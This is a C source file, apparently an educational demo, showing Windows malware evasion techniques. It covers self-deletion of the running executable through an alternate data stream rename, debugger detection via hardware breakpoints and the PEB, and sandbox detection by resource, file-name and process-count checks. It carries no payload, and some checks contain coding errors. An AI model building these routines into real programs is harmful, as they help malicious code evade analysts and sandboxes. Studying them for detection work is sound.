#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
/*
Simple example that demostrates debugger detection, virtual env detection and self deletion
*/
#define NEW_STREAM L":malware"


//Self deletion function
BOOL DeleteSelf() {
    HANDLE fHand = NULL;
    WCHAR path[MAX_PATH * 2] = { 0 };
    FILE_DISPOSITION_INFO DelFile = { 0 };
    PFILE_RENAME_INFO pfInfo = NULL;
    const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
    SIZE_T sRename = sizeof(FILE_RENAME_INFO) + sizeof(wchar_t) * (wcslen(NewStream) + 1);

    
    printf("Allocating some heap for file disposition info\n");
    //Allocate some space for file rename info
    pfInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
    if (!pfInfo) {
        printf("Heap allocation failed: %d\n", GetLastError());
        return FALSE;
    }

    ZeroMemory(path, sizeof(path));
    ZeroMemory(&DelFile, sizeof(FILE_DISPOSITION_INFO));

    //Mark file to be deleted
    DelFile.DeleteFile = TRUE;

    //Initialize new name of data stream
    pfInfo->FileNameLength = wcslen(NewStream) * sizeof(wchar_t); //sizeof(NewStream);
    pfInfo->RootDirectory = NULL;
    pfInfo->ReplaceIfExists = TRUE;
    //pfInfo->FileNameLength = wcslen(NewStream) * sizeof(wchar_t);
    RtlCopyMemory(pfInfo->FileName, NewStream, pfInfo->FileNameLength);

    printf("Getting current filename\n");
    //Get current filename
    if (GetModuleFileName(NULL, path, MAX_PATH * 2) == 0) {
        printf("Couldnt get file name: %d\n", GetLastError());
        return FALSE;
    }
    wprintf(L"File path: %s\n", path);

    //Retrieve file handle
    fHand = CreateFileW(path, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    if (fHand == INVALID_HANDLE_VALUE) {
        printf("Opening file failed: %d\n", GetLastError());
        return FALSE;
    }
    wprintf(L"Renaming :$DATA stream to: %s\n", NEW_STREAM);
    //Renaming DATA stream
    if (!SetFileInformationByHandle(fHand, FileRenameInfo, pfInfo, sRename)) {
        printf("SetFileInformationByHandle failed: %d\n", GetLastError());
        return FALSE;
    }
    CloseHandle(fHand);


    if (GetModuleFileName(NULL, path, MAX_PATH * 2) == 0) {
        printf("Couldnt get file name: %d\n", GetLastError());
        return FALSE;
    }
    wprintf(L"File path: %s\n", path);


    printf("Opening new handle to file\n");
    //Open new handle to the current file
    fHand = CreateFileW(path, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    if (fHand == INVALID_HANDLE_VALUE) {
        printf("Opening file failed: %d\n", GetLastError());
        return FALSE;
    }

    printf("Marking file for deletion\n");
    //Mark for deletion after the handle is closed
    if (!SetFileInformationByHandle(fHand, FileDispositionInfo, &DelFile, sizeof(DelFile))) {
        printf("SetFileInformationByHandle2 failed: %d\n", GetLastError());
        return FALSE;
    }
    CloseHandle(fHand);
    printf("Done!\n");
    HeapFree(GetProcessHeap(), 0, pfInfo);
    return TRUE;
}

//Anti-debugging techniques
// 
//Try to detect hardware breakpoints
BOOL DebuggerHardWareBP() {
    CONTEXT cont = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
    if (!GetThreadContext(GetCurrentThread(), &cont)) {
        printf("Cant get the context of the current thread: %d\n", GetLastError());
        return FALSE;
    }

    if (cont.Dr0 != NULL || cont.Dr1 != NULL || cont.Dr2 != NULL || cont.Dr3 != NULL) {
        return TRUE; //Debugger detected
    }
    return FALSE;
}

/*
//Try to detect debugger trough PEB
BOOL DebuggerPresent() {
#ifdef _WIN64
    PPEB pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
    PPEN pPeb = (PEB*)(__readfsdword(0x30));
#endif
    if (pPeb->BeingDebugged == 1) {
        return TRUE; //Debugger detected
    }
    return FALSE;
}


//Try to detect if process is started by debugger
BOOL StartedWithDebugger() {
#define FLG_HEAP_ENABLE_TAIL_CHECK   0x10
#define FLG_HEAP_ENABLE_FREE_CHECK   0x20
#define FLG_HEAP_VALIDATE_PARAMETERS 0x40

#ifdef _WIN64
    PPEB pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
    PPEN pPeb = (PEB*)(__readfsdword(0x30));
#endif
    if (pPeb->NtGlobalFlag == (FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)) {
        return TRUE; //Started by debugger
    }
    return FALSE;
}
*/


//Detecting virtual environments
//Check if the host has less than 2 CPUs and 2GB of memory, highly indicative of VM
BOOL CheckResources() {
    SYSTEM_INFO sys = { 0 };
    MEMORYSTATUSEX mem = { .dwLength = sizeof(MEMORYSTATUSEX) };

    GetSystemInfo(&sys);
    GlobalMemoryStatusEx(&mem);

    if (sys.dwNumberOfProcessors < 2 || (DWORD)mem.ullTotalPhys < (DWORD)(2 * 1073741824)) {
        return TRUE; // System is running with less than 2 cpus or less than 2 GB of ram
    }
    return FALSE;
}


//Check if the program's file name is changed, most sandboxes use some from of a hash (md5)
BOOL CheckName() {
    CHAR* path[MAX_PATH * 3];
    CHAR FileName[MAX_PATH];
    DWORD digits = 0;

    GetModuleFileNameA(NULL, path, MAX_PATH * 3);
    if (lstrlen(PathFindFileName(path)) < MAX_PATH) {
        lstrcpyA(FileName, PathFindFileNameA(path));
    }

    //Count digits
    for (int i = 0; i < lstrlenA(FileName); i++) {
        if (isdigit(FileName[i])) {
            digits++;
        }
    }

    //Max allowed are 3
    if (digits > 3) {
        return TRUE; //Possible sandbox
    }
    return FALSE;
}

//Check the number of running processes
BOOL NumProcess() {
    DWORD procs[1024];
    DWORD returnLength = NULL, ProcNum = NULL;

    EnumProcesses(procs, sizeof(procs), &returnLength);
    ProcNum = returnLength / sizeof(DWORD);

    if (ProcNum < 30) {
        return TRUE;
    }
    return FALSE;
}



//Simple sleep like function for testing
void delay(int seconds) {
    int i, j;
    for (i = 0; i < seconds; i++) {
        for (j = 0; j < 1000000; j++) {
            printf("sleeping..");
        }
    }
}



int main()
{

    printf("Starting and self deleting\n");
    DeleteSelf();
    delay(20);
    printf("This will still run after the file is deleted!\n");
    return 0;
}
